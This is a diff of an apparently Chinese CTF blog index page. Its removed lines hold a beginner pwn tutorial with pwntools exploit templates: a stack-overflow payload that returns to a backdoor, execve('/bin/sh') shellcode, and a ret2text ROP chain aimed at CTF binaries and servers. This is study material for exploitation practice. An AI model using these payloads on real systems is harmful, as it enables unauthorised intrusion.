+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-11 13:26:41" itemprop="dateModified" datetime="2022-04-11T13:26:41+08:00">2022-04-11</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Windows%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">Windows逆向</span></a>
+                  <a href="/categories/%E5%BC%80%E5%8F%91/" itemprop="url" rel="index"><span itemprop="name">开发</span></a>
                 </span>
             </span>
 
@@ -866,14 +921,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>98k</span>
+              <span>88k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1:30</span>
+              <span>1:20</span>
             </span>
 
         </div>
@@ -885,10 +940,10 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>做CTF的逆向题时苦于对大佬们的wp各种看不懂，只因自己太菜跟不上大佬的节奏，所以才写了这一篇最最最基础的，保姆级的，手把手教的，看完包会的调试器使用教程。其中重点讲OllyDbg，参考看雪的书《加密与解密》，参考小甲鱼的视频《OD使用教程》做的笔记，其次做了一些x64dbg与OD有区别的笔记。希望这篇文章不仅能帮助你们看懂大佬们的wp，而且可以自己实现逆向破解，一起加油吧！</p>
+          <h1 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h1><p>类相当于C语言的结构体，但结构体内不能有函数，而类可以。类是一个模型，而对象是类实现的具体事物。</p>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/posts/33a085c7.html#more" rel="contents">
+              <a class="btn" href="/posts/8df0ec14.html#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -912,7 +967,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/posts/de6e58e0.html">
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/f4e89fa4.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -926,7 +981,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/posts/de6e58e0.html" class="post-title-link" itemprop="url">x86汇编基础</a>
+            <a href="/posts/f4e89fa4.html" class="post-title-link" itemprop="url">BUUCTF 逆向合集</a>
         </h2>
 
         <div class="post-meta">
@@ -935,10 +990,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-04-11 13:16:29 / 修改时间：13:22:19" itemprop="dateCreated datePublished" datetime="2022-04-11T13:16:29+08:00">2022-04-11</time>
+              <time title="创建时间：2022-04-05 09:29:27" itemprop="dateCreated datePublished" datetime="2022-04-05T09:29:27+08:00">2022-04-05</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-11 13:26:32" itemprop="dateModified" datetime="2022-04-11T13:26:32+08:00">2022-04-11</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -974,10 +1035,10 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>很久之前看王爽老师的《汇编语言》写的笔记，可能不太准确，先做个存档吧。</p>
+          <p>前面很容易就解出来的题我就没放上来，都已经做过这么多题了，相信对你们来说也是so easy。</p>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/posts/de6e58e0.html#more" rel="contents">
+              <a class="btn" href="/posts/f4e89fa4.html#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -1001,7 +1062,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/posts/1c971db4.html">
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/17c1c819.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -1015,7 +1076,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/posts/1c971db4.html" class="post-title-link" itemprop="url">pwn基础入门</a>
+            <a href="/posts/17c1c819.html" class="post-title-link" itemprop="url">Bugku Android逆向合集</a>
         </h2>
 
         <div class="post-meta">
@@ -1025,14 +1086,14 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2022-04-10 14:27:13" itemprop="dateCreated datePublished" datetime="2022-04-10T14:27:13+08:00">2022-04-10</time>
+              <time title="创建时间：2022-04-05 09:29:27" itemprop="dateCreated datePublished" datetime="2022-04-05T09:29:27+08:00">2022-04-05</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-04-11 13:03:17" itemprop="dateModified" datetime="2022-04-11T13:03:17+08:00">2022-04-11</time>
+                <time title="修改时间：2022-04-11 13:26:29" itemprop="dateModified" datetime="2022-04-11T13:26:29+08:00">2022-04-11</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1040,7 +1101,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">漏洞渗透</span></a>
+                  <a href="/categories/Android%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">Android逆向</span></a>
                 </span>
             </span>
 
@@ -1050,14 +1111,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>7.9k</span>
+              <span>4.2k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>7 分钟</span>
+              <span>4 分钟</span>
             </span>
 
         </div>
@@ -1069,338 +1130,111 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="1-Linux入门"><a href="#1-Linux入门" class="headerlink" title="1. Linux入门"></a>1. Linux入门</h1><div class="table-container">
-<table>
-<thead>
-<tr>
-<th>命令</th>
-<th>含义</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>pwd</td>
-<td>输出当前路径</td>
-<td>pwd</td>
-</tr>
-<tr>
-<td>ls</td>
-<td>列出位于当前路径的文件</td>
-<td>ls -al</td>
-</tr>
-<tr>
-<td>cd xxx</td>
-<td>改变当前路径，前往xxx目录</td>
-<td>cd ~/workspace</td>
-</tr>
-<tr>
-<td>cat xxx</td>
-<td>直接展示xxx文件的内容</td>
-<td>cat hw.c</td>
-</tr>
-<tr>
-<td><em>*</em> \</td>
-<td>grep xxx</td>
-<td><em>*</em>是其他命令，输出含有xxx的行</td>
-<td>cat hw.c \</td>
-<td>grep stdio.h</td>
-</tr>
-<tr>
-<td><em>*</em> \</td>
-<td>less</td>
-<td>查看输出更舒服，jk上下移动q退出</td>
-<td>cat hw.c \</td>
-<td>less</td>
-</tr>
-<tr>
-<td>./xxx</td>
-<td>运行当前目录xxx可执行文件</td>
-<td>./a.out</td>
-</tr>
-</tbody>
-</table>
-</div>
-<h1 id="2-汇编基础"><a href="#2-汇编基础" class="headerlink" title="2. 汇编基础"></a>2. 汇编基础</h1><p> 内存地址：在有段/偏移寄存器的语境下一般记为<code>段:偏移</code>，如<code>CS:IP</code>,<code>SS:IP</code>,<code>SS:BP</code>,<code>DS:DI</code>,<code>DS:SI</code>,<code>DS:[]</code></p>
-<script type="math/tex; mode=display">
-一个内存地址=段地址×16+偏移地址\\
-1234h:ABCDh=12340h+ABCDh=1CF0Dh</script><p>小端序：低地址存放低位数据</p>
-<p>一个程序的内存空间：</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>高地址</th>
-<th style="text-align:center">OS Kernel Space</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td></td>
-<td style="text-align:center">Stack</td>
-</tr>
-<tr>
-<td></td>
-<td style="text-align:center">↓(blank)</td>
-</tr>
-<tr>
-<td></td>
-<td style="text-align:center">Shared Libraries</td>
-</tr>
-<tr>
-<td></td>
-<td style="text-align:center">↑(blank)</td>
-</tr>
-<tr>
-<td></td>
-<td style="text-align:center">Heap</td>
-</tr>
-<tr>
-<td></td>
-<td style="text-align:center">BSS</td>
-</tr>
-<tr>
-<td></td>
-<td style="text-align:center">Data(RW)数据段</td>
-</tr>
-<tr>
-<td></td>
-<td style="text-align:center">Text(RX)代码段</td>
-</tr>
-<tr>
-<td>低地址</td>
-<td style="text-align:center">(blank)</td>
-</tr>
-</tbody>
-</table>
-</div>
-<p>栈：</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th style="text-align:center">SS:SP 栈顶</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">SS:BP 栈帧基底</td>
-</tr>
-<tr>
-<td style="text-align:center">SS 栈底</td>
-</tr>
-</tbody>
-</table>
-</div>
-<p>寄存器总结</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>name</th>
-<th>用途</th>
-<th>name</th>
-<th>用途</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>AX</td>
-<td>通常用来存放函数的返回值</td>
-<td>SS(Stack Seg)</td>
-<td>栈的段地址/基地址</td>
-</tr>
-<tr>
-<td>CX</td>
-<td>通常用来做循环计数器</td>
-<td>CS(Code Seg)</td>
-<td>下一条指令的段地址</td>
-</tr>
-<tr>
-<td>BX</td>
-<td></td>
-<td>DS(Data Seg)</td>
-<td>数据的段地址</td>
-</tr>
-<tr>
-<td>DX</td>
-<td></td>
-<td><strong>SP(Stack Pointer)</strong></td>
-<td>栈顶偏移地址</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td><strong>BP(Base Pointer)</strong></td>
-<td>栈的基址偏移地址</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td><strong>IP(Instruction Pointer)</strong></td>
-<td>下一条指令的偏移地址</td>
-</tr>
-</tbody>
-</table>
-</div>
-<p>汇编指令</p>
-<p><img src="F:\markdown图片\pwn知识点\汇编指令.png" alt="汇编指令"></p>
-<h1 id="3-程序装载与栈帧结构"><a href="#3-程序装载与栈帧结构" class="headerlink" title="3. 程序装载与栈帧结构"></a>3. 程序装载与栈帧结构</h1><p>在Linux的可执行文件ELF</p>
-<p>ELF文件类型：</p>
-<ul>
-<li>Relocatable File(*.o)：可重定位文件，用来链接的素材</li>
-<li>Executable File(*)：可执行文件</li>
-<li>Shared Object File(*.so)：共享目标文件，用于做动态链接库</li>
-</ul>
-<h1 id="4-实战环境配置和工具介绍"><a href="#4-实战环境配置和工具介绍" class="headerlink" title="4. 实战环境配置和工具介绍"></a>4. 实战环境配置和工具介绍</h1><p>连接远程服务器：</p>
-<p>nc表示netcat</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc node4.buuoj.cn 28487</span><br></pre></td></tr></table></figure>
-<p>使用file查看文件信息，checksec查看文件保护信息。</p>
-<img src="/posts/1c971db4/checksec.png" class="" title="文件信息">
-<p>利用gdb调试ELF文件：</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>命令</th>
-<th>简写</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>file</td>
-<td></td>
-<td>装载一个文件，可以在gdb后加参数，效果等同</td>
-</tr>
-<tr>
-<td>kill</td>
-<td></td>
-<td>终止当前调试的进程</td>
-</tr>
-<tr>
-<td>run</td>
-<td>r</td>
-<td>运行当前装载的文件，运行过程中使用Ctrl + C退出程序交互，进入调试(在退出时位置)</td>
-</tr>
-<tr>
-<td>next</td>
-<td>n</td>
-<td>=step over 单步步过</td>
-</tr>
-<tr>
-<td>step</td>
-<td>s</td>
-<td>=step into 单步步入</td>
-</tr>
-<tr>
-<td>continue</td>
-<td>c</td>
-<td>继续执行程序，直到下一个中断或程序结束</td>
-</tr>
-<tr>
-<td>finish</td>
-<td>fini</td>
-<td>运行到函数返回处</td>
-</tr>
-<tr>
-<td>catch</td>
-<td></td>
-<td>设置捕捉点</td>
-</tr>
-<tr>
-<td>thread</td>
-<td>t</td>
-<td>查看当前程序的线程信息</td>
-</tr>
-<tr>
-<td>break</td>
-<td>b</td>
-<td>在当前位置设置断点</td>
-</tr>
-<tr>
-<td>backtrace</td>
-<td>k</td>
-<td>查看当前函数调用栈信息</td>
-</tr>
-<tr>
-<td>stack</td>
-<td></td>
-<td>stack n 查看栈内容</td>
-</tr>
-<tr>
-<td>vmmap</td>
-<td></td>
-<td>查看程序中的分段，相当于OD中的<code>E</code>模块</td>
-</tr>
-</tbody>
-</table>
-</div>
-<h1 id="5-缓冲区溢出"><a href="#5-缓冲区溢出" class="headerlink" title="5. 缓冲区溢出"></a>5. 缓冲区溢出</h1><p>编写程序时没有考虑或错误设置用户输入长度，导致用户向缓冲区输入长度超过接受变量长度，从而覆盖到其它正常数据，破坏栈帧结构。</p>
-<p>缓冲区溢出常见的漏洞函数：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">gets</span><span class="params">(<span class="type">char</span> *str)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> handle, <span class="type">void</span> *buf, <span class="type">int</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">scanf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">getchar</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> format, ...)</span>;</span><br></pre></td></tr></table></figure>
-<p>如果文件中有”/bin/sh”，可用以下脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;/usr/bin/x-terminal-emulator&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interface</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line">binary_name = <span class="string">&#x27;filename&#x27;</span></span><br><span class="line">port = <span class="number">12345</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process([<span class="string">&quot;./&quot;</span> + binary_name])</span><br><span class="line">    e = ELF(<span class="string">&#x27;./&#x27;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&#x27;e.libc&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;ctf.spaceskynet.top&quot;</span>, port)</span><br><span class="line">    e = ELF(<span class="string">&quot;./&quot;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&quot;libc-2.23.so&quot;)</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        gdb.attach(p, a)</span><br><span class="line">        <span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            raw_input()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rc = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data: p.sendlineafter(delim, data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># main</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    z(<span class="string">&#x27;b foo&#x27;</span>)		<span class="comment">#在foo函数下断</span></span><br><span class="line">    <span class="comment"># 如果直到backdoor和binsh的地址可直接写地址</span></span><br><span class="line">    <span class="comment"># backdoor = 0x08049172</span></span><br><span class="line">    <span class="comment"># bin_sh = 0x0804A008</span></span><br><span class="line">    backdoor = e.symbols[<span class="string">&#x27;backdoor&#x27;</span>]	<span class="comment">#参数为函数名字</span></span><br><span class="line">    bin_sh = <span class="built_in">next</span>(e.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)) <span class="comment">#在ELF文件中找/bin/sh</span></span><br><span class="line">    main_addr = e.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x1c</span> + p32(backdoor) + p32(main_addr) + p32(bin_sh)	<span class="comment"># 即执行完backdoor函数后返回到main函数</span></span><br><span class="line">    sl(payload)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
-<h1 id="6-Shellcode"><a href="#6-Shellcode" class="headerlink" title="6. Shellcode"></a>6. Shellcode</h1><p>shellcode就是能使程序调用shell的一段代码(通常为汇编级别/机器码)。一旦某种shellcode被执行，我们就能够拿到目标机器的控制权限，从而获取flag。</p>
-<ul>
-<li>system(“/bin/sh”);（？） -&gt; execve(“/bin/sh”, 0, 0)</li>
-<li>触发中断(int 0x80 / syscall)</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">; first.asm</span><br><span class="line">; first get shell test in pwn class</span><br><span class="line">; nasm -f elf32 first.asm</span><br><span class="line">; ld -m elf_i386 -o getShell first.o</span><br><span class="line">; objump -d getShell</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">	push &quot;/sh&quot;</span><br><span class="line">	push &quot;/bin&quot;</span><br><span class="line">	mov ebx, esp</span><br><span class="line">	xor edx, edx</span><br><span class="line">	xor ecx, ecx</span><br><span class="line">	mov al, 0xb</span><br><span class="line">	int 0x80</span><br></pre></td></tr></table></figure>
-<p>Shellcode脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br><span class="line">    payload1 = asm(shellcraft.sh())</span><br><span class="line">    My_Shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e69622f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    payload2 = asm(My_Shellcode)</span><br><span class="line">    p = process(<span class="string">&#x27;./mrctf2020_shellcode&#x27;</span>)</span><br><span class="line">    <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, 25266)</span></span><br><span class="line">    <span class="comment"># p.sendline(payload1)</span></span><br><span class="line">    p.sendline(payload2)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
-<h1 id="7-ROP链构造"><a href="#7-ROP链构造" class="headerlink" title="7. ROP链构造"></a>7. ROP链构造</h1><p>NX——NO Execute bit(禁止执行位)是应用在CPU上的安全技术，它支持了操作系统级别的DEP——Data Execute Prevention(数据执行保护，Microsoft)。在应用了NX的系统上，(如果可执行文件开启保护)，会把内存中的区域分为只供存储指令和只供存储数据两种。NX bit 被标记在内存分页中使用的页表索引上，如果置1，则该页内存数据不允许被执行，即把所有内容作为数据处理。这样可以防范shellcode注入攻击。</p>
-<p>ROP——Return-Oriented Programming(返回导向编程)技术，允许攻击者在开启了栈不可执行等安全保护技术的情况下，执行恶意代码。</p>
-<p>核心思想是通过栈溢出等方式，改写栈上的控制信息(调用栈，即return address, rbp等)，以控制调用栈，劫持程序控制流并执行一些针对性的命令序列(gadgets)。</p>
-<p>gadgets主要指一些以ret结尾的小段汇编指令，它们的执行通过ret语句和栈上控制的返回地址相连，构成一条ROP链。链的功能是设置寄存器值，泄露信息，调用函数等。</p>
-<h2 id="7-1-Ret2Text"><a href="#7-1-Ret2Text" class="headerlink" title="7.1 Ret2Text"></a>7.1 Ret2Text</h2><p>gadget一般存在于Text中，或者广义上存在于ELF文件中(指令部分)。将返回地址改写为能执行某些特定功能的gadget地址，构造ROP链。</p>
-<p>辅助工具：ropper、pwntools(ELF class)</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;/usr/bin/x-terminal-emulator&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interface</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line">binary_name = <span class="string">&#x27;filename&#x27;</span></span><br><span class="line">port = <span class="number">12345</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process([<span class="string">&quot;./&quot;</span> + binary_name])</span><br><span class="line">    e = ELF(<span class="string">&#x27;./&#x27;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&#x27;e.libc&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;ctf.spaceskynet.top&quot;</span>, port)</span><br><span class="line">    e = ELF(<span class="string">&quot;./&quot;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&quot;libc-2.23.so&quot;)</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        gdb.attach(p, a)</span><br><span class="line">        <span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            raw_input()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rc = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data: p.sendlineafter(delim, data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># main</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># backdoor = e.plt[&#x27;system&#x27;]</span></span><br><span class="line">    backdoor = e.symbols[<span class="string">&#x27;backdoor&#x27;</span>]	<span class="comment">#参数为函数名字</span></span><br><span class="line">    bin_sh = <span class="built_in">next</span>(e.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)) <span class="comment">#在ELF文件中找/bin/sh</span></span><br><span class="line">    poprdi = <span class="number">0x4011eb</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x08</span> + p64(poprdi) + p64(bin_sh) + p64(backdoor)	<span class="comment"># 将当前rdi的值扔掉，bin_sh的地址赋给rdi，作为参数调用backdoor中的system</span></span><br><span class="line">    sl(payload)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
-<p>如果文件中没有system函数，如果想要调用system函数，要利用到PLT表。</p>
-<h2 id="7-2-Ret2syscall"><a href="#7-2-Ret2syscall" class="headerlink" title="7.2 Ret2syscall"></a>7.2 Ret2syscall</h2><ul>
-<li>一般为静态链接的可执行文件，指令非常多，也提供了许多gadget</li>
-</ul>
-<ul>
-<li>最核心gadget：syscall(int 0x80)</li>
-</ul>
-<ul>
-<li>整体类似Shellcode注入</li>
-</ul>
-<img src="/posts/1c971db4/7.2.1.png" class="" title="静动态链接">
-<p>静态链接的ELF文件在IDA的函数窗口全是一片白，没有粉色的动态链接。</p>
-<p>利用ROPgadget工具，自行生成ROP链。</p>
-<h2 id="7-3-PLT表和GOT表"><a href="#7-3-PLT表和GOT表" class="headerlink" title="7.3 PLT表和GOT表"></a>7.3 PLT表和GOT表</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52126646/article/details/119494939">GOT表和PLT表</a></p>
-<p>这里的PLT表示<code>.plt</code>，GOT表表示<code>.got.plt</code>。<code>.got</code>存放其它全局符号信息，与<code>.got.plt</code>不同，与<code>.plt</code>关系不大。</p>
-<h2 id="7-4-Ret2libc"><a href="#7-4-Ret2libc" class="headerlink" title="7.4 Ret2libc"></a>7.4 Ret2libc</h2><ul>
-<li>对动态链接文件，一般链接glibc</li>
-</ul>
-<ul>
-<li>glibc链接基址未知，需要进行基址泄露</li>
-</ul>
-<ul>
-<li>一般需要程序循环，可以通过ROP链构造循环</li>
-</ul>
